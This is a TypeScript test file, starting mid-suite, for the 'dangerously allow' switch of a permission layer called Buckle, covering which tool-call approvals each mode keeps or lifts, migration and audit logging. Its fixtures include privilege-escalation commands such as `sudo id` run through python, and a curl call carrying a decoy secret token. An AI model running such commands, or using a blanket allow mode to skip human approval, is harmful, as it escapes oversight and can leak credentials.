      { kind: 'code run by an unknown interpreter', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'python3', args: ['-c', 'import os; os.system("sudo id")'] }], rule: 'destructive_command' },
    ]
  }

  /** Plain asks every mode but off lifts. */
  function plainAsks(setup: Node): Array<{ kind: string; tool: string; effects: ToolEffect[]; rule: PermissionRuleId }> {
    return [
      { kind: 'a write', tool: 'fs_write', effects: [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }], rule: 'write_scope' },
      { kind: 'a private host', tool: 'web_fetch', effects: [{ kind: 'network', url: 'http://127.0.0.1:9/probe' }], rule: 'network_egress' },
    ]
  }

  /** A node where a delete inside the workspace asks, so the file floor asks there. */
  async function moded() {
    const setup = await node({ environment: { BUCKLE_DELETE_IN_WORKSPACE: 'ask' } })
    writeFileSync(join(setup.workspace, 'doomed.txt'), 'x\n')
    writeFileSync(join(setup.workspace, '.env.local'), `API_TOKEN=${DECOY}\n`)
    await setup.runtime.policy.apply(LISTED)
    return setup
  }

  /** `buckle policy dangerously-allow <argv>`, with what it printed. */
  async function switchTo(runtime: BuckleRuntime, argv: string[]): Promise<CliOutput> {
    const printed = { out: '', err: '' }
    const out = vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => { printed.out += String(chunk); return true })
    const err = vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => { printed.err += String(chunk); return true })
    try {
      const { exitCode } = await policyCommand(runtime, ['dangerously-allow', ...argv], { ignoreWarning: false })
      return { exitCode, ...printed }
    } finally {
      out.mockRestore()
      err.mockRestore()
    }
  }

  /** `buckle policy <argv>`, with what it printed to stdout. */
  async function policyOut(runtime: BuckleRuntime, argv: string[]): Promise<string> {
    let printed = ''
    const out = vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => { printed += String(chunk); return true })
    try {
      await policyCommand(runtime, argv, { ignoreWarning: false })
      return printed
    } finally {
      out.mockRestore()
    }
  }

  const modesOf = async (runtime: BuckleRuntime, requestId: string) => (await uses(runtime, requestId)).map(entry => [entry.detail, (entry.args as { mode?: unknown }).mode]).sort()
  const changesOf = async (runtime: BuckleRuntime) => (await auditEntries(runtime.actions, 200)).filter(entry => entry.tool === 'policy_dangerously_allow_changed' && entry.event === 'result').map(entry => entry.detail)
  const storedFile = (setup: Node) => JSON.parse(readFileSync(dangerouslyAllowPath(setup.config), 'utf8')) as { version: number; workspaces: Record<string, unknown> }

  it('safe keeps a sudo ask, a destructive-list ask, a file floor delete, and an unknown interpreter\'s ask, and lifts a write ask and a private host ask', async () => {
    const setup = await moded()
    const { runtime, workspace } = setup
    const switched = await switchTo(runtime, ['safe'])
    expect(switched.exitCode).toBe(0)
    expect(switched.out).toContain(`WARNING: dangerously allow is now safe for workspace ${runtime.workspaceName()}`)
    expect(switched.out).toContain(coversOf('safe'))
    expect(runtime.policy.dangerouslyAllow()).toEqual({ mode: 'safe', boundTo: workspace, setByEarlierBuild: false })
    expect(storedFile(setup)).toEqual({ version: 2, workspaces: { [runtime.workspaceId]: { mode: 'safe', changedAt: expect.any(String) } } })

    for (const row of floorAsks(setup)) {
      const kept = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, asked: asked(kept.result) }).toEqual({ kind: row.kind, asked: [row.rule] })
      expect(kept.execute).not.toHaveBeenCalled()
      expect(await uses(runtime, kept.requestId)).toEqual([])
    }
    for (const row of plainAsks(setup)) {
      const lifted = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: lifted.result.outcome }).toEqual({ kind: row.kind, outcome: 'ok' })
      expect(await modesOf(runtime, lifted.requestId)).toEqual([[row.rule, 'safe']])
    }
    const secret = await run(runtime, 'shell_exec', SECRET)
    expect(asked(secret.result)).toEqual(['sensitive_path'])
    expect(await changesOf(runtime)).toEqual(['safe'])
  })

  it('on lifts all of them, a secret reference\'s file included', async () => {
    const setup = await moded()
    const { runtime, workspace } = setup
    const switched = await switchTo(runtime, ['on'])
    expect(switched.exitCode).toBe(0)
    expect(switched.out).toContain(`WARNING: dangerously allow is now on for workspace ${runtime.workspaceName()}`)
    expect(switched.out).not.toContain('still ask')
    expect(runtime.policy.dangerouslyAllow()).toEqual({ mode: 'on', boundTo: workspace, setByEarlierBuild: false })
    expect(storedFile(setup)).toEqual({ version: 2, workspaces: { [runtime.workspaceId]: { mode: 'on', changedAt: expect.any(String) } } })

    for (const row of [...floorAsks(setup), ...plainAsks(setup)]) {
      const lifted = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: lifted.result.outcome }).toEqual({ kind: row.kind, outcome: 'ok' })
      expect(await modesOf(runtime, lifted.requestId)).toEqual([[row.rule, 'on']])
    }
    const ran: JsonValue[] = []
    const tool = runtime.registry().get('shell_exec')
    const prepare = tool.prepare.bind(tool)
    vi.spyOn(tool, 'prepare').mockImplementation(args => ({ ...prepare(args), execute: async () => { ran.push(args); return 'ran' } }))
    const secret = await run(runtime, 'shell_exec', SECRET)
    expect(secret.result.outcome).toBe('ok')
    expect(ran).toEqual([{ command: 'curl', args: ['-H', `Authorization: Bearer ${DECOY}`] }])
    expect(await modesOf(runtime, secret.requestId)).toEqual([['sensitive_path', 'on'], ['write_scope', 'on']])
    expect(JSON.stringify(await auditEntries(runtime.actions, 200))).not.toContain(DECOY)
  })

  it('under safe, asks the floor ask of a call alone, and runs it once a person approves it, the plain ask lifted and audited', async () => {
    const setup = await moded()
    const { runtime } = setup
    await runtime.policy.setDangerouslyAllow('safe', { ignoreWarning: false })
    const execute = vi.fn(async () => 'executed')
    const prepare = vi.spyOn(runtime.registry().get('shell_exec'), 'prepare').mockReturnValue({ effects: [{ kind: 'exec', command: 'sudo', args: ['ls'] }, { kind: 'write_path', path: setup.workspace }], execute })
    const request = { requestId: `dangerously-mixed-${randomUUID()}`, tool: 'shell_exec', args: {} }
    const first = await runtime.invoke({ request: { ...request, approvalTokens: [] }, sessionId: 'dangerously-session', approvalWait: { mode: 'none' } })
    expect(first.outcome === 'approval_required' && first.approvals.map(({ rule, subject }) => [rule, subject])).toEqual([['destructive_command', expect.stringMatching(/^sudo ls /)]])
    const token = first.outcome === 'approval_required' ? first.approvals[0]!.token : ''
    expect(await runtime.approvalService.decide({ source: 'cli', decision: { token, outcome: 'approve', scope: 'once' } })).toMatchObject({ status: 'applied' })
    const ran = await runtime.invoke({ request: { ...request, approvalTokens: [token] }, sessionId: 'dangerously-session', approvalWait: { mode: 'none' } })
    prepare.mockRestore()
    expect(ran.outcome).toBe('ok')
    expect(execute).toHaveBeenCalledOnce()
    expect(await modesOf(runtime, request.requestId)).toEqual([['write_scope', 'safe']])
  })

  it.each([[['true'], 'on'], [['false'], 'off'], [['on'], 'on'], [['safe'], 'safe'], [['off'], 'off']])('reads %j as %s', async (argv, mode) => {
    const setup = await node()
    if (mode === 'off') await setup.runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    expect((await switchTo(setup.runtime, argv)).exitCode).toBe(0)
    expect(setup.runtime.policy.dangerouslyAllow().mode).toBe(mode)
    expect((await changesOf(setup.runtime)).at(-1)).toBe(mode)
  })

  it.each([[['on', 'command']], [['on', 'all']], [['command']], [['all']]])('refuses the earlier level %j in one line naming the new words, and nothing changes', async (argv) => {
    const setup = await node()
    await setup.runtime.policy.setDangerouslyAllow('safe', { ignoreWarning: false })
    const before = readFileSync(dangerouslyAllowPath(setup.config), 'utf8')
    const refused = await switchTo(setup.runtime, argv)
    expect(refused).toEqual({ exitCode: 1, out: '', err: `buckle policy dangerously-allow takes on, safe, or off (true and false read as on and off), not ${JSON.stringify(argv.join(' '))}: the levels command and all are gone, and the switch is unchanged\n` })
    expect(readFileSync(dangerouslyAllowPath(setup.config), 'utf8')).toBe(before)
    expect(setup.runtime.policy.dangerouslyAllow().mode).toBe('safe')
    expect(await changesOf(setup.runtime)).toEqual(['safe'])
  })

  it('refuses another word, and a word after the mode, with the usage', async () => {
    const setup = await node()
    for (const argv of [['yes'], ['off', 'now'], ['safe', 'please'], []]) {
      const refused = await switchTo(setup.runtime, argv)
      expect(refused.exitCode).toBe(1)
      expect(refused.err).toContain('buckle policy dangerously-allow takes on, safe, or off\n')
      expect(refused.err).toContain('buckle policy show')
    }
    expect(existsSync(dangerouslyAllowPath(setup.config))).toBe(false)
  })

  it.each([
    ['at level command', { on: true, changedAt: '2026-10-25T00:00:00.000Z' }],
    ['at level all', { on: true, level: 'all', changedAt: '2026-10-25T00:00:00.000Z' }],
  ])('reads a version 1 file that held the switch on %s as off, says so in policy show, and writes version 2 once switched', async (_, entry) => {
    const setup = await node()
    const { runtime, workspace } = setup
    writeFileSync(dangerouslyAllowPath(setup.config), JSON.stringify({ version: 1, workspaces: { [runtime.workspaceId]: entry } }))
    expect(runtime.policy.dangerouslyAllow()).toEqual({ mode: 'off', boundTo: workspace, setByEarlierBuild: true })
    expect((await call(runtime, 'fs_write', [{ kind: 'write_path', path: join(workspace, 'note.md') }])).result.outcome).toBe('approval_required')
    expect(await policyOut(runtime, ['show'])).toContain('Dangerously allow  off: an earlier build of Buckle set it on, and this build reads its file as off; buckle policy dangerously-allow on or safe sets it again')
    expect(JSON.parse(await policyOut(runtime, ['show', '--json'])).dangerouslyAllow).toEqual({ mode: 'off', boundTo: workspace, setByEarlierBuild: true })

    expect((await switchTo(runtime, ['safe'])).exitCode).toBe(0)
    expect(storedFile(setup)).toEqual({ version: 2, workspaces: { [runtime.workspaceId]: { mode: 'safe', changedAt: expect.any(String) } } })
    expect(runtime.policy.dangerouslyAllow()).toEqual({ mode: 'safe', boundTo: workspace, setByEarlierBuild: false })
  })

  it('turns a version 1 file off as version 2, and says nothing of an earlier build where it held the switch off', async () => {
    const setup = await node()
    const { runtime } = setup
    writeFileSync(dangerouslyAllowPath(setup.config), JSON.stringify({ version: 1, workspaces: { [runtime.workspaceId]: { on: true, changedAt: '2026-10-25T00:00:00.000Z' } } }))
    expect((await switchTo(runtime, ['off'])).exitCode).toBe(0)
    expect(storedFile(setup)).toEqual({ version: 2, workspaces: {} })
    expect(runtime.policy.dangerouslyAllow().setByEarlierBuild).toBe(false)
    writeFileSync(dangerouslyAllowPath(setup.config), JSON.stringify({ version: 1, workspaces: {} }))
    expect(runtime.policy.dangerouslyAllow()).toEqual({ mode: 'off', boundTo: setup.workspace, setByEarlierBuild: false })
    expect(await policyOut(runtime, ['show'])).toContain('Dangerously allow  off\n')
  })

  it('keeps a version 1 file whole beside the version 2 file the first set writes, its other entries among it, and keeps the first copy', async () => {
    const setup = await node()
    const { runtime } = setup
    const entry = { on: true, changedAt: '2026-10-25T00:00:00.000Z' }
    const earlier = { version: 1, workspaces: { [runtime.workspaceId]: entry, [`${runtime.workspaceId}.earlier-move`]: entry, 'another-workspace': entry } }
    const aside = join(dirname(dangerouslyAllowPath(setup.config)), 'dangerously-allow.earlier.json')
    writeFileSync(dangerouslyAllowPath(setup.config), JSON.stringify(earlier))
    expect((await switchTo(runtime, ['safe'])).exitCode).toBe(0)
    expect(storedFile(setup)).toEqual({ version: 2, workspaces: { [runtime.workspaceId]: { mode: 'safe', changedAt: expect.any(String) } } })
    expect(JSON.parse(readFileSync(aside, 'utf8'))).toEqual(earlier)

    expect((await switchTo(runtime, ['off'])).exitCode).toBe(0)
    writeFileSync(dangerouslyAllowPath(setup.config), JSON.stringify({ version: 1, workspaces: { newer: entry } }))
    expect((await switchTo(runtime, ['on'])).exitCode).toBe(0)
    expect(JSON.parse(readFileSync(aside, 'utf8'))).toEqual(earlier)
  })

  it('writes no copy where the file is already version 2 or there is none', async () => {
    const setup = await node()
    const aside = join(dirname(dangerouslyAllowPath(setup.config)), 'dangerously-allow.earlier.json')
    expect((await switchTo(setup.runtime, ['safe'])).exitCode).toBe(0)
    expect((await switchTo(setup.runtime, ['on'])).exitCode).toBe(0)
    expect(existsSync(aside)).toBe(false)
  })

  it('reads a version 2 file that names a mode it does not know as off', async () => {
    const setup = await node()
    await setup.runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const stored = storedFile(setup)
    stored.workspaces[setup.runtime.workspaceId] = { mode: 'everything', changedAt: '2026-11-08T00:00:00.000Z' }
    writeFileSync(dangerouslyAllowPath(setup.config), JSON.stringify(stored))
    expect(setup.runtime.policy.dangerouslyAllow()).toMatchObject({ mode: 'off', setByEarlierBuild: false })
    expect((await call(setup.runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])).result.outcome).toBe('approval_required')
  })

  it('audits each use with its mode, in the log and the report, and each change with the mode it set', async () => {
    const setup = await moded()
    const { runtime, reports } = setup
    for (const mode of ['on', 'safe'] as const) {
      await runtime.policy.setDangerouslyAllow(mode, { ignoreWarning: false })
      const { requestId } = await call(runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])
      expect((await uses(runtime, requestId)).map(entry => entry.args)).toEqual([{ tool: 'fs_write', rule: 'write_scope', subject: setup.workspace, mode }])
      expect(reports.filter(report => report.tool === 'policy_dangerously_allowed' && report.requestId === requestId).map(report => report.args)).toEqual([{ tool: 'fs_write', rule: 'write_scope', subject: setup.workspace, mode }])
    }
    await runtime.policy.setDangerouslyAllow('off', { ignoreWarning: false })
    expect(await changesOf(runtime)).toEqual(['on', 'safe', 'off'])
  })

  it('keeps the entries an earlier build wrote as they were, its levels named, for buckle log to show', async () => {
    const setup = await node()
    const { runtime } = setup
    const at = new Date().toISOString()
    const base = { at, sessionId: 'local-owner', outcome: 'ok' as const, durationMs: 0, effects: [], auditId: randomUUID(), event: 'result' as const, workspaceId: runtime.workspaceId }
    await runtime.actions.record({ ...base, requestId: 'earlier-change', tool: 'policy_dangerously_allow_changed', args: {}, detail: 'on all' })
    await runtime.actions.record({ ...base, auditId: randomUUID(), requestId: 'earlier-use', tool: 'policy_dangerously_allowed', args: { tool: 'fs_write', rule: 'write_scope', subject: setup.workspace, level: 'command' }, approvedBy: ['dangerously_allow'], detail: 'write_scope' })
    const kept = (await auditEntries(runtime.actions, 200)).filter(entry => entry.requestId.startsWith('earlier-'))
    expect(kept.map(entry => [entry.tool, entry.detail, entry.args])).toEqual([
      ['policy_dangerously_allow_changed', 'on all', {}],
      ['policy_dangerously_allowed', 'write_scope', { tool: 'fs_write', rule: 'write_scope', subject: setup.workspace, level: 'command' }],
    ])
  })

  it('shows each mode in policy show, in words and as JSON', async () => {
    const setup = await node()
    const { runtime, workspace } = setup
    await runtime.policy.setDangerouslyAllow('safe', { ignoreWarning: false })
    const safe = await policyOut(runtime, ['show'])
    expect(safe).toContain('Dangerously allow  SAFE, bound to the workspace root, or its mount when one is set')
    expect(safe).toContain(coversOf('safe'))
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const on = await policyOut(runtime, ['show'])
    expect(on).toContain('Dangerously allow  ON, bound to the workspace root, or its mount when one is set')
    expect(on).toContain(coversOf('on'))
    expect(JSON.parse(await policyOut(runtime, ['show', '--json'])).dangerouslyAllow).toEqual({ mode: 'on', boundTo: workspace, setByEarlierBuild: false })
  })
})

describe('the switch as data', () => {
  it('reads its uses back from allowedBy, and redacts command lines to the executable', () => {
    expect(dangerousUses(['write_scope:/a', 'dangerously_allow:safe:network_egress:127.0.0.1:9', 'dangerously_allow:on:sensitive_path:secret-file:/w/.env'])).toEqual([
      { mode: 'safe', rule: 'network_egress', subject: '127.0.0.1:9' },
      { mode: 'on', rule: 'sensitive_path', subject: 'secret-file:/w/.env' },
    ])
    // A key that names no mode the switch is on at is no use of it, an earlier build's levels and off among them.
    expect(dangerousUses(['dangerously_allow:command:write_scope:/a', 'dangerously_allow:all:write_scope:/a', 'dangerously_allow:off:write_scope:/a', 'dangerously_allow:write_scope:/a'])).toEqual([])
    expect(redactedSubject('destructive_command', 'curl -H Authorization: secret')).toBe('curl [29 characters]')
    expect(redactedSubject('read_scope', '/tmp/outside')).toBe('/tmp/outside')
    expect(redactedSubject('read_scope', 'x'.repeat(300))).toBe('[300 characters]')
  })
})
